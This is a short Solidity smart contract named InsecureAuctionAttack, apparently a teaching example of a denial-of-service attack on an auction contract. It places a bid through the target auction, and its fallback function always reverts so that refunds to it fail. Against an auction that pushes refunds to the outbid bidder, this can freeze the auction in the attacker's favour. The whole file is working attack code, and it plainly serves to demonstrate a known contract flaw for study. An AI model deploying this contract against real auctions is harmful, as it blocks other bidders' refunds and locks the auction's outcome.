pragma solidity ^0.4.18;

contract InsecureAuctionAttack {
  address auction;

  function InsecureAuctionAttack(address _auction) {
    auction = _auction;
  }

  function() payable {
    require(false); // always throw not to receive refund
  }

  function bid() payable {
    // call InsecureAuction.bid()
    require(auction.call.value(msg.value)(bytes4(sha3("bid()"))));
  }
}
